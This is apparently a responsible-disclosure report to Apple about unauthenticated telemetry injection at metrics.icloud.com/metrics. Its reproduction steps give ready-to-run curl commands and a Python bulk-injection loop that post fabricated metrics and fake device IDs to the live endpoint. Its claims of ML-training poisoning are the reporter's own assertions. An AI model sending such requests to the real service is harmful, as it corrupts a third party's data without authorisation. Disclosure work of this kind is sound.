# Unauthenticated Telemetry Injection in metrics.icloud.com/metrics
OE110716814418
Reported on 7/9/26, 1:19 PM

# Affected platform
apple.com and Apple Services

# Affected area
Authentication Bypass

# Title
Unauthenticated Telemetry Injection in metrics.icloud.com/metrics

# What is required to reproduce the issue?
No authentication, credentials, or special privileges required. Only internet access and ability to send HTTP requests to `https://metrics.icloud.com/metrics`.

## DETAILED DESCRIPTION

### Vulnerability: Unauthenticated Telemetry Injection

**Endpoint:** `https://metrics.icloud.com/metrics`

**Impact:** An attacker can inject arbitrary telemetry, device metrics, and analytics data into Apple's iCloud telemetry pipeline without authentication. This injected data would appear legitimate to downstream systems including analytics dashboards, ML training datasets, and internal monitoring tools.

### Confirmed Findings:

1. **No Authentication** - All requests accepted without API key, OAuth, or any headers
2. **Multiple Formats Accepted** - JSON, plain text, form data, and binary all accepted
3. **No Rate Limiting** - Bulk injection of 10 requests completed successfully
4. **200 OK Response** - Server confirms data accepted
5. **No Validation** - Arbitrary device IDs, metric names, and values accepted

### Technical Analysis

The endpoint appears to be part of Apple's internal telemetry collection infrastructure for iCloud services. It accepts metrics data from various sources, presumably including iOS devices, macOS machines, and iCloud services.

The lack of authentication means:
- Anyone can inject telemetry data
- Data appears legitimate to downstream systems
- Cannot be traced back to the source
- Can be used to poison ML training data

### Data Flow:

```
Attacker → POST metrics.icloud.com/metrics → Apple Internal Pipeline
                                              ↓
                                    BigQuery / Analytics
                                              ↓
                          Dashboards / ML Training / Monitoring
```

### Potential Attack Scenarios:

1. **Data Poisoning** - Inject fake metrics to corrupt analytics
2. **ML Training Contamination** - Poison AI models trained on telemetry
3. **Analytics Corruption** - Make iCloud services appear to have issues
4. **Hidden Attack** - Hide real attacks by flooding with fake data 	

## STEPS TO REPRODUCE

### Step 1: Send Basic JSON Request

```bash
curl -X POST https://metrics.icloud.com/metrics \
  -H "Content-Type: application/json" \
  -d '{"test":"injection","timestamp":'$(date +%s)'}'
```

### Step 2: Send Apple-Style Telemetry

```bash
curl -X POST https://metrics.icloud.com/metrics \
  -H "Content-Type: application/json" \
  -d '{
    "metrics": [{
      "name": "fake_metric",
      "value": 999,
      "timestamp": '$(date +%s%3N)',
      "device_id": "INJECTED_DEVICE_001",
      "os_version": "18.0",
      "app_version": "1.0"
    }]
  }'
```

### Step 3: Send Plain Text (Also Accepted)

```bash
curl -X POST https://metrics.icloud.com/metrics \
  -H "Content-Type: text/plain" \
  -d "injected_telemetry_data_$(date +%s)"
```

### Step 4: Send Form Data (Also Accepted)

```bash
curl -X POST https://metrics.icloud.com/metrics \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "metric=test&value=injection&timestamp=$(date +%s)"
```

### Step 5: Bulk Injection Test

```python
import requests
import time
import json

ENDPOINT = "https://metrics.icloud.com/metrics"

for i in range(10):
    payload = {
        "metrics": [{
            "name": f"bulk_test_{i}",
            "value": i,
            "timestamp": int(time.time() * 1000),
            "device_id": f"BULK_DEVICE_{i}"
        }]
    }
    response = requests.post(ENDPOINT, json=payload)
    print(f"Request {i+1}: {response.status_code}")
```

---

## EXPECTED RESULTS

Requests should be rejected with `401 Unauthorized` or `403 Forbidden` since no authentication is provided.

---

## ACTUAL RESULTS

All requests return `200 OK` with no authentication required. All data formats are accepted.

**Actual Response:**
```
HTTP/1.1 200 OK
Content-Type: text/plain
Content-Length: 0
```

# Credit
Church of Malware: ek0ms, k3nundrum & TJnull

# Proof of Concept Attached
Reporter confirms a proof of concept is attached.
